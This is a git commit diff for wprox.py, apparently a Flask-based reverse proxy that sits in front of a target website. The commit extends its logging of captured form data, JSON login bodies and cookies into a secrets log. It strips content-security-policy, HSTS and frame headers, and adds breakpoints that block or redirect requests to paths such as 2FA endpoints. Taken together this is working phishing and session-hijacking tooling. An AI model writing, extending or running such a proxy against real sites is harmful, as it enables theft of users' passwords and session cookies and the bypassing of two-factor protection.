38a589441b93aff5ef432880ed5b55490f93fe39
Rich Infante <rich@richinfante.com>
2022-08-15 19:36:37 -0400

    feat: ux improvements for breakpoints and logging

--- wprox.py
+++ wprox.py
@@ -1,15 +1,17 @@
 import argparse
-from bs4 import BeautifulSoup
-import requests
 import cgi
-import urllib.parse as urlparse
 import json
 import logging
+import re
+import urllib.parse as urlparse
+from typing import List
 
-from flask import Flask
-from flask import request
+import requests
 import waitress
+from bs4 import BeautifulSoup
+from flask import Flask, request
 from waitress import task
+
 
 # ref: https://stackoverflow.com/questions/287871/how-do-i-print-colored-text-to-the-terminal
 class TermColor:
@@ -23,37 +25,72 @@ class TermColor:
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
 
+# Headers that might mess with our proxying or modification of the site.
+SECURITY_HEADERS = [
+  'content-security-policy',
+  'permissions-policy',
+  'x-frame-options',
+  'x-xss-protection',
+  'strict-transport-security'
+]
+
+"""
+Filter log entries with a regex (or regexes)
+"""
+class RegexLogFilter(logging.Filter):
+  def __init__(self, filters: List):
+    super(RegexLogFilter, self).__init__()
+    self.regex_filters = [re.compile(filter, re.MULTILINE | re.IGNORECASE) for filter in filters]
+
+  def filter(self, record):
+    message = record.getMessage()
+    for filter in self.regex_filters:
+      if re.search(filter, message):
+        return True
+
+    return False
+
+
 """
 Create a proxy for a host and port combination.
 """
-def make_proxy(target_host, target_proto, breakpoints=[], secrets_file='secrets.log', traffic_file='traffic.log', quiet=False):
+def make_proxy(target_host, target_proto, breakpoints=[], secrets_file='secrets.log', traffic_file='traffic.log', stdout_log_mode='all', break_redir=None, filter_logs=[]):
+  # set up log formatters and stdout channel
   formatter = logging.Formatter(fmt='%(asctime)s %(levelname)-8s %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
   stdout_formatter = logging.Formatter(fmt=f'{TermColor.BOLD}%(asctime)s %(levelname)s{TermColor.ENDC} %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
   channel = logging.StreamHandler()
   channel.setFormatter(stdout_formatter)
 
+  # set up logger for secrets
   secret_logger = logging.getLogger('secrets')
   secret_logger.setLevel(logging.INFO)
-  secret_logger.propagate = False
+  secret_logger.propagate = False  # propagation not needed, adding our own Streamhandler
   if secrets_file != 'off':
     fh = logging.FileHandler(secrets_file)
     fh.setLevel(logging.INFO)
     fh.setFormatter(formatter)
     secret_logger.addHandler(fh)
 
-  if not quiet:
+  if stdout_log_mode in ['all', 'secrets']:
     secret_logger.addHandler(channel)
 
+  # set up logger for traffic
   traffic_logger = logging.getLogger('traffic')
   traffic_logger.setLevel(logging.INFO)
-  traffic_logger.propagate = False
+  traffic_logger.propagate = False  # propagation not needed, adding our own Streamhandler
   if traffic_file != 'off':
     fh = logging.FileHandler(traffic_file)
     fh.setLevel(logging.INFO)
     fh.setFormatter(formatter)
     traffic_logger.addHandler(fh)
 
-  traffic_logger.addHandler(channel)
+  if stdout_log_mode in ['all', 'traffic']:
+    traffic_logger.addHandler(channel)
+
+  # Support filtering on stdout.
+  # All logs still go to full logfiles.
+  if filter_logs:
+    channel.addFilter(RegexLogFilter(filter_logs))
 
   app = Flask(__name__, static_folder=None)
 
@@ -84,24 +121,32 @@ def make_proxy(target_host, target_proto, breakpoints=[], secrets_file='secrets.
       if 'Content-Type' in modified_headers:
         mimetype, options = cgi.parse_header(modified_headers['Content-Type'])
         in_decoded = raw_in.decode(options.get('encoding', 'utf8'))  # if no encoding, assume utf8
+
+        # log form contents
         if mimetype == 'application/x-www-form-urlencoded':
-          secret_logger.info('capture(%s): %s: form: %s', request.remote_addr, path, urlparse.parse_qs(in_decoded))
+          secret_logger.info('capture(%s): /%s: form: %s', request.remote_addr, path, urlparse.parse_qs(in_decoded))
+
+        # log JSON api contents
         elif mimetype == 'application/json':
-          secret_logger.info('capture(%s): %s: json: %s', request.remote_addr, path, json.loads(in_decoded))
+          secret_logger.info('capture(%s): /%s: json: %s', request.remote_addr, path, json.loads(in_decoded))
 
       # if they've sent cookies, log them.
       if 'Cookie' in modified_headers:
         secret_logger.info('cookie(%s): %s', request.remote_addr, modified_headers['Cookie'])
 
-      if breakpoints and '/%s' % path in breakpoints:
+      breakpoint_expr = '%s:/%s' % (request.method.upper(), path)
+      if breakpoints and breakpoint_expr in breakpoints:
         traffic_logger.info('proxy(%s): BREAKPOINT: %s %s/%s', request.remote_addr, request.method, target_host, path)
-        return b'', 200, {}
+        if break_redir:
+          return b'', 302, {'Location': break_redir}  # redirect to any target
+        else:
+          return b'Internal Server Error', 500, {}  # return blank response
 
       # log proxy request
       traffic_logger.info('proxy(%s): %s %s/%s', request.remote_addr, request.method, target_host, path)
 
       # make request object to send to upstream
-      esreq = requests.Request(
+      request_object = requests.Request(
         method=request.method,
         url='%s://%s/%s' % (target_proto, target_host, path),
         headers=modified_headers,
@@ -111,17 +156,23 @@ def make_proxy(target_host, target_proto, breakpoints=[], secrets_file='secrets.
 
       # send to upstream
       resp = requests.Session().send(
-        esreq.prepare(),
+        request_object.prepare(),
         stream=True,
-        allow_redirects=False # don't want to be smart - breaks web functionality
+        allow_redirects=False # don't want to be smart - breaks web functionality. We want the browser to perform redirects.
       )
 
-      # modify headers, remove any ones we don't need.
-      # Use waitress's list of hop-by-hop headers
+      traffic_logger.debug('proxy(%s): %s %s/%s %s', request.remote_addr, request.method, target_host, path, resp.status_code)
+
+      # Modify headers, remove any ones we don't need.
+      # These headers are used for things like transfer encoding, etc, or security.
+      # These are only needed inside the requests module. Our server might add different ones.
       out_headers = {}
       for (h, hv) in resp.headers.items():
         if h.lower() in task.hop_by_hop:
+          # Use waitress's list of hop-by-hop headers
           pass  # if considered to be "hop-by-hop", drop it.
+        if h.lower() in SECURITY_HEADERS:
+          pass # skip writing security headers like content-security-policy
         else:
           out_headers[h] = hv
 
@@ -175,12 +226,13 @@ where permission from upstream site owners has been given.
     parser.add_argument('--num-threads', help='Number of threads for request serving', default=8, type=int)
     parser.add_argument('--dev-mode', help='Use flask dev server (not recommended)', action='store_true')
     parser.add_argument('--debug', help='Print some extra debug info', action='store_true')
-    parser.add_argument('--break', dest='breakpoints', help='"break" drop requests to a specific path on this server, like analytics, logging, 2fa.', nargs='+')
+    parser.add_argument('--break', dest='breakpoints', help='"break" drop requests to a specific path on this server, like analytics, logging, 2fa. e.g.: --break "POST:/login/2fa"', nargs='+')
+    parser.add_argument('--break-redir', help='Redirect to arbitrary location when breakpoint is triggered', default=None)
     parser.add_argument('--secrets-log', help='Logfile to write secrets to', default='secrets.log')
     parser.add_argument('--traffic-log', help='Logfile to write traffic logs to', default='traffic.log')
     parser.add_argument('--trusted-proxy', help='When running behind a reverse-proxy, trust it to pass headers containing forwarded info', default=None)
-    parser.add_argument('--quiet', help='Hide messages about credentials and just display traffic logs in STDOUT', action='store_true')
-
+    parser.add_argument('--log', dest='stdout_log_mode', help='Set traffic types to log', choices=['all', 'secrets', 'traffic', 'none'], default='all')
+    parser.add_argument('--filter', dest='filter_exprs', help='Filter logs to specific expressions (regex supported', nargs='+')
     # parse args
     args = parser.parse_args()
 
@@ -188,7 +240,7 @@ where permission from upstream site owners has been given.
       print(args)
 
     # create a proxy for this host/protocol
-    app = make_proxy(args.host, args.proto, breakpoints=args.breakpoints, secrets_file=args.secrets_log, traffic_file=args.traffic_log, quiet=args.quiet)
+    app = make_proxy(args.host, args.proto, breakpoints=args.breakpoints, secrets_file=args.secrets_log, traffic_file=args.traffic_log, stdout_log_mode=args.stdout_log_mode, break_redir=args.break_redir, filter_logs=args.filter_exprs)
 
     # start the server
     if args.dev_mode:
